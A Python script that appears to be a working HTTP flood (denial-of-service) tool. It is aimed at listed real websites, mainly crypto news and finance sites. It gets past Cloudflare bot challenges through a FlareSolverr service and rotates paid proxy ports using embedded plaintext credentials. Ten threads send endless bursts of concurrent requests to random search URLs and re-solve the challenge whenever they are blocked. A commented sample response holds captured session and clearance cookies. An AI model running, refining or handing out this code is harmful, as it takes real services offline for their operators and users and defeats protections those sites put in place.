from urllib import request
import json
from threading import Thread, Lock
import random
import string
import time
import grequests
import requests

# printing lowercase
letters = string.ascii_lowercase

PORT=10000
PROXY_USER = 'spcmp28zj1' 
PROXY_PASS = '123123123'
PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@all.dc.smartproxy.com:PORT'

attackList = [
# 'https://coinspot.nl/fr',
# 'https://cryptonaute.fr',
'https://www.finaria.it'
]

def checkIp(proxies):
	ipUrl='https://api.ipify.org'
	print(requests.get(ipUrl, proxies=proxies).content)
	# input()


def checkmyHeaders():
	url='http://myhttpheader.com/'
	data = {"cmd": "request.get",
			"url": url,
			}
	resStr = requests.post(flareSolverUrl, json=data).content
	print(resStr)
	input()

def changeProxies():
	PORT=random.randrange(10001,49999)
	PROXY_URL = PROXY_URL_BASE.replace('PORT',str(PORT))

	proxies = {
   'http': PROXY_URL,
   'https': PROXY_URL,
	}

	return PROXY_URL, proxies

def my_handler(request, exception):
    print(f"exception thrown by grequests: \n{exception}")
    return request

def solveChanellnge(url):
	while True:
		try:
			PROXY_URL, proxies = changeProxies()

			data = {"cmd": "request.get",
					"url": url,
					"returnOnlyCookies": True,
					'proxy': {'url': PROXY_URL}  
					}
			resStr = requests.post(flareSolverUrl, json=data).content
			#resStr = resStr = '{"status": "ok", "message": "Challenge solved!", "solution": {"url": "https://www.business2community.com/?s=cdydbddble", "status": 200, "cookies": [{"domain": ".business2community.com", "expiry": 1708081856, "httpOnly": false, "name": "_ga", "path": "/", "secure": false, "value": "GA1.2.188049281.1673521856"}, {"domain": "www.business2community.com", "expiry": 1673522156, "httpOnly": false, "name": "outbrain_cid_fetch", "path": "/", "secure": false, "value": "true"}, {"domain": ".business2community.com", "expiry": 1708081855, "httpOnly": false, "name": "_ga_858T4FEZRM", "path": "/", "secure": false, "value": "GS1.1.1673521855.1.0.1673521855.60.0.0"}, {"domain": ".business2community.com", "expiry": 1673521915, "httpOnly": false, "name": "_gat_UA-16168243-1", "path": "/", "secure": false, "value": "1"}, {"domain": ".business2community.com", "expiry": 1673608256, "httpOnly": false, "name": "_gid", "path": "/", "secure": false, "value": "GA1.2.1087775293.1673521856"}, {"domain": "www.business2community.com", "expiry": 1673740818, "httpOnly": false, "name": "fet-cc-settings-used", "path": "/", "secure": false, "value": "1"}, {"domain": "www.business2community.com", "expiry": 1673523055, "httpOnly": false, "name": "_omappvs", "path": "/", "sameSite": "Lax", "secure": true, "value": "1673521855649"}, {"domain": ".business2community.com", "expiry": 1681297855, "httpOnly": false, "name": "_gcl_au", "path": "/", "secure": false, "value": "1.1.1693920470.1673521856"}, {"domain": "www.business2community.com", "expiry": 1708081855, "httpOnly": false, "name": "advanced_ads_page_impressions", "path": "/", "secure": false, "value": "%7B%22expires%22%3A1988881856%2C%22data%22%3A1%7D"}, {"domain": ".business2community.com", "expiry": 1673523656, "httpOnly": true, "name": "__cf_bm", "path": "/", "sameSite": "None", "secure": true, "value": "gnTMx1_cH9sX.hWAEH8H0M3UBeG2pUIihqBdbOd1YWg-1673521856-0-ATR4MeD2772ARbCtalFTAMOUB2Fi2i5hx/o0njAWI4CrFDE+aivRgf2wVktvT910v01tqgv5q2FYPZ7lD4KHriK6yec3y6ZoLXu79KBqeBHelDO68L/uG+sKdaesfAQtPAMi6v9Cig3TXLQM0XPFO+0="}, {"domain": "www.business2community.com", "httpOnly": false, "name": "PHPSESSID", "path": "/", "secure": false, "value": "09vlvh6d1otp1k52jpk2lidrbd"}, {"domain": "www.business2community.com", "expiry": 1673740818, "httpOnly": false, "name": "fet-user-identity", "path": "/", "secure": false, "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ3d3cuYnVzaW5lc3MyY29tbXVuaXR5LmNvbSIsInR5cGUiOiJwdWIiLCJpYXQiOjE2NzM0ODE2MDAsImV4cCI6MTY3Mzc0MDgwMH0.zLVkpYjx4ZwmvvYQ1loz90iYEV4fJ4wngd4wPXOwQ6Q"}, {"domain": "www.business2community.com", "expiry": 1673740818, "httpOnly": false, "name": "fet-user-identity-pub", "path": "/", "secure": false, "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ3d3cuYnVzaW5lc3MyY29tbXVuaXR5LmNvbSIsInR5cGUiOiJwdWIiLCJpYXQiOjE2NzM0ODE2MDAsImV4cCI6MTY3Mzc0MDgwMH0.zLVkpYjx4ZwmvvYQ1loz90iYEV4fJ4wngd4wPXOwQ6Q"}, {"domain": ".business2community.com", "expiry": 1705057837, "httpOnly": true, "name": "cf_clearance", "path": "/", "sameSite": "None", "secure": true, "value": "cMMcLKcZjTK13F3SvOW19t3v.D8eq0sN5GNIhVa_bkI-1673521837-0-150"}, {"domain": "www.business2community.com", "expiry": 1708081855, "httpOnly": false, "name": "_omappvp", "path": "/", "sameSite": "Lax", "secure": true, "value": "QfrB4VpZlY2KCbk8e1wy61kwZB2QTWulR1VRVxoRNmPnySteasaHs94cT9yht60yTzgFfXMeJXE7eMfdAeqfN2JEkvApr6W7"}, {"domain": "www.business2community.com", "expiry": 1705057855, "httpOnly": false, "name": "advanced_ads_pro_visitor_referrer", "path": "/", "secure": false, "value": "%7B%22expires%22%3A1705057856%2C%22data%22%3A%22https%3A//www.business2community.com/%3Fs%3Dcdydbddble%26__cf_chl_tk%3DqxHFeeAU.E2BWWjAa_bwAkNCtvtlm3oPN83TWmM63nU-1673521835-0-gaNycGzNCJE%22%7D"}], "userAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}, "startTimestamp": 1673521834786, "endTimestamp": 1673521856754, "version": "3.0.2"}'
			# print(resStr)

			res = json.loads(resStr)

			status = res["solution"]["status"]
			cookies = res["solution"]["cookies"]
			userAgent = res["solution"]["userAgent"]
			# print(status,cookies,userAgent)

			cookiesStr=''
			for cookie in cookies:
				cookiesStr = cookiesStr + cookie['name']+'='+cookie['value']+'; '
			cookiesStr = cookiesStr[:-2]
			# print('got cookies:')
			# print(cookiesStr)

			return cookiesStr, userAgent, proxies
		except Exception as err:
			print('error in solving, trying again', err)


def attackUrlCF(baseUrl):	
	cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)

	while True:
		try:
			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 

			headers={'User-Agent': userAgent,
			'Accept-Language': 'en-US,en;q=0.9',
			'Accept-Encoding': 'gzip, deflate',
			'Cookie': cookiesStr,
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1',
			}

			# checkIp()

			requestsArr = []
			for x in range(10):
				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
			res = grequests.map(requestsArr, exception_handler=my_handler)
			print(baseUrl , res)
			# print(res[0].content)
			if str(res[0].status_code) in ['503', '403', '429']:
				print('resolsing chalennge')
				cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
				print('resolved')
			
			# input()
		except Exception as err:
			print(err)
			#input()

def attackAll():
	for url in attackList:
		attackUrlCF(url)


flareSolverUrl = 'http://localhost:8191/v1'

for i in range(10):
	for url in attackList:
		Thread(target=attackUrlCF, args=[url]).start()
		time.sleep(10)
input()




